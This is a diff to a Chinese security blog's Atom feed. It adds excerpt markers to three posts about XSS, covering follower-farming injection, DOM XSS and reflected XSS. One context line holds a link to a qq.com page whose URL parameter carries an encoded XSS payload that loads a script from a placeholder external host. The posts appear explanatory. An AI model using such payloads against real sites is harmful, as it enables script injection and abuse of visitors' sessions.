@@ -4,7 +4,7 @@
   <title><![CDATA[分类：security | 移动开发技术]]></title>
   <link href="http://jason5.cn/blog/categories/security/atom.xml" rel="self"/>
   <link href="http://jason5.cn/"/>
-  <updated>2016-08-03T14:32:19+08:00</updated>
+  <updated>2016-11-13T22:39:25+08:00</updated>
   <id>http://jason5.cn/</id>
   <author>
     <name><![CDATA[jason]]></name>
@@ -19,6 +19,9 @@
     <updated>2016-08-03T11:34:13+08:00</updated>
     <id>http://jason5.cn/blog/xssying-yong-wei-bo-shua-fen</id>
     <content type="html"><![CDATA[<p>目前腾讯监控系统发现space.aili.com存在大量恶意的请求，通过xxx.qq.com以期望达到刷微博粉丝的效果</p>
+
+<!--more-->
+
 
 <p>被插入代码截图如下（每个页面都有，框架被修改）</p>
 
@@ -69,6 +72,9 @@
     <id>http://jason5.cn/blog/dom-xss</id>
     <content type="html"><![CDATA[<p>因为JavaScript脚本功能强大，我们可以利用它来更改整个页面内容，所以我们就可以制造出利用真的目标域名的假页面</p>
 
+<!--more-->
+
+
 <p><a href="http://app.2008.qq.com/ppzj/view_dh.php?page=%22%3E%3Cscript%20src%3D%22http%3A%2F%2Fxxxx.com%2Fyy.js%22%3E%3C%2Fscript%3E">http://app.2008.qq.com/ppzj/view_dh.php?page=%22%3E%3Cscript%20src%3D%22http%3A%2F%2Fxxxx.com%2Fyy.js%22%3E%3C%2Fscript%3E</a></p>
 
 <p><img src="http://jason5.cn/images/xss-dom.png" alt="" /></p>
@@ -101,6 +107,9 @@
     <updated>2016-08-01T20:18:08+08:00</updated>
     <id>http://jason5.cn/blog/fan-she-xing-xss</id>
     <content type="html"><![CDATA[<p>早时候出现的一个反射型XSS漏洞</p>
+
+<!--more-->
+
 
 <p>漏洞URL
 <code>
